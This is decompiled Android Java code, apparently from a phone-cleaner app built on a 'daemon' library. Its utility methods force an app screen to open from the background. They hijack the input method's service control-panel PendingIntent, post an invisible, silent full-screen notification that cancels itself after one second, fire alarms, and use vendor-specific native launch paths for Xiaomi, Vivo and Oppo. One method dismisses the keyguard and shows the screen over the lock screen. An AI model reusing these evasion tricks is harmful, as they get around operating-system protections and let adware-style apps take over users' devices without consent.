package v0;

import static android.app.PendingIntent.FLAG_MUTABLE;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.ActivityManager;
import android.app.AlarmManager;
import android.app.KeyguardManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.Window;
import android.widget.RemoteViews;

import com.daemon.activity.StrategyIDSAAAActivity;
import com.daemon.common.Model;
import com.daemon.core.NativeDaemonApi;
import com.knight.cleaning.R;

import java.util.List;
import java.util.Random;

import s.h;
/* compiled from: AppUtil.java */
/* loaded from: classes.dex */

public class AppUtil {

    /* renamed from: a  reason: collision with root package name */
    public static final Handler f8212a = new Handler(Looper.getMainLooper());

    public static void c(Context context, Intent intent) {
        PendingIntent runningServiceControlPanel;
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        if (intent.getData() == null) {
            String className = intent.getComponent().getClassName();
            intent.setData(Uri.parse(g.a(context.getString(R.string.schema_flag), "://", context.getPackageName(), "/", className.substring(className.lastIndexOf(".") + 1))));
        }
        try {
            ActivityManager activityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
            String string = Settings.Secure.getString(context.getContentResolver(), "default_input_method");
            String str = string.split("/")[0];
            String str2 = string.split("/")[1];
            if (str2.startsWith(".")) {
                str2 = g.a(str, str2);
            }
            if (Build.VERSION.SDK_INT < 31 && !e.c() && (runningServiceControlPanel = activityManager.getRunningServiceControlPanel(new ComponentName(str, str2))) != null) {
                runningServiceControlPanel.send(context, 0, intent);
            }
            PendingIntent activity = PendingIntent.getActivity(context, new Random().nextInt(), intent, FLAG_MUTABLE);
            if (activity != null) {
                activity.send(context, 0, intent);
            }
        } catch (PendingIntent.CanceledException unused) {
        }
    }

    public static void d(Context context, Intent intent) {
        PendingIntent activity = PendingIntent.getActivity(context, new Random().nextInt(), intent, FLAG_MUTABLE);
        String packageName = context.getPackageName();
        @SuppressLint("RemoteViewLayout") RemoteViews remoteViews = new RemoteViews(context.getPackageName(), R.layout.layout_gone_notification);
        final NotificationManager notificationManager = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel notificationChannel = new NotificationChannel(packageName, packageName, 4);
            notificationChannel.setDescription(packageName);
            notificationChannel.setLockscreenVisibility(-1);
            notificationChannel.enableLights(false);
            notificationChannel.enableVibration(false);
            notificationChannel.setShowBadge(false);
            notificationChannel.setSound(null, null);
            notificationChannel.setBypassDnd(true);
            notificationManager.createNotificationChannel(notificationChannel);
        }
        if (activity != null) {
            try {
                activity.send();
            } catch (Exception e2) {
                intent.addFlags(268435456);
                context.startActivity(intent);
                e2.printStackTrace();
            }
        }
        Notification a2 = new h(context, packageName).l(R.mipmap.ic_launcher).i(activity, true).f(remoteViews).e(remoteViews).d(remoteViews).c(remoteViews).j(true).n(null).m(null).g(8).a();
        int nextInt = new Random().nextInt();
        notificationManager.cancel(nextInt);
        notificationManager.notify(nextInt, a2);
        f8212a.postDelayed(new Runnable() { // from class: v0.a
            @Override // java.lang.Runnable
            public final void run() {
                notificationManager.cancelAll();
            }
        }, 1000L);
    }

    public static boolean e(Context context, String str) {
        List<ActivityManager.RunningTaskInfo> runningTasks = ((ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE)).getRunningTasks(1);
        if (runningTasks == null || runningTasks.size() <= 0) {
            return false;
        }
        return str.equals(runningTasks.get(0).topActivity.getClassName());
    }

    public static void g(Context context, Intent intent) {
        if (e(context, intent.getComponent().getClassName())) {
            return;
        }
        if (e.c()) {
            if (((PowerManager) context.getSystemService(Context.POWER_SERVICE)).isScreenOn()) {
                i(context, intent);
            } else {
                d(context, intent);
            }
        } else if (Build.VERSION.SDK_INT >= 30) {
            i(context, intent);
        } else {
            d(context, intent);
        }
    }

    public static void h(Context context) {
        if (Build.VERSION.SDK_INT >= 29 && !e.g()) {
            context.getPackageManager().setComponentEnabledSetting(new ComponentName(context, StrategyIDSAAAActivity.class.getName()), 1, 1);
        }
    }

    public static void i(Context context, Intent intent) {
        s.c.b((AlarmManager) context.getSystemService(Context.ALARM_SERVICE), 0, System.currentTimeMillis() + 200, PendingIntent.getActivity(context, new Random().nextInt(), intent, FLAG_MUTABLE));
    }

    public static void j(Activity activity) {
        Window window = activity.getWindow();
        KeyguardManager keyguardManager = (KeyguardManager) activity.getSystemService(Context.KEYGUARD_SERVICE);
        int i2 = Build.VERSION.SDK_INT;
        if (i2 >= 26) {
            keyguardManager.requestDismissKeyguard(activity, null);
        } else {
            keyguardManager.newKeyguardLock("kplock").disableKeyguard();
        }
        window.addFlags(4194304);
        window.addFlags(524288);
        window.addFlags(1);
        window.addFlags(512);
        window.addFlags(32);
        window.getDecorView().setSystemUiVisibility(1024);
        if (!e.f() && i2 >= 28) {
            activity.setShowWhenLocked(true);
        }
        window.getDecorView().setSystemUiVisibility(1792);
//        window.getDecorView().setSystemUiVisibility(o.a.f5654b);
    }

    public static void k(final Context context, final Intent intent, int i2) {
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        try {
            if (e.g() && !d.c(context)) {
                NativeDaemonApi.startActivity(context, intent, Model.XIAO.getModel());
            } else if (e.f() && !d.c(context)) {
                NativeDaemonApi.startActivity(context, intent, Model.VIVO.getModel());
            } else if (e.e() && !d.c(context)) {
                NativeDaemonApi.startActivity(context, intent, Model.OPPO.getModel());
            } else if (e.c()) {
                if (((PowerManager) context.getSystemService(Context.POWER_SERVICE)).isScreenOn()) {
                    d(context, intent);
                } else {
                    i(context, intent);
                }
            } else if (Build.VERSION.SDK_INT >= 30) {
                d(context, intent);
            } else {
                c(context, intent);
            }
        } catch (Exception unused) {
            if (Build.VERSION.SDK_INT >= 30) {
                d(context, intent);
            } else {
                c(context, intent);
            }
        }
        f8212a.postDelayed(new Runnable() {
            @Override
            public final void run() {
                AppUtil.g(context, intent);
            }
        }, i2);
    }

    public static void l(Context context, Class<?> cls) {
        m(context, cls, 1500);
    }

    public static void m(Context context, Class<?> cls, int i2) {
        k(context, new Intent(context, cls), i2);
    }
}

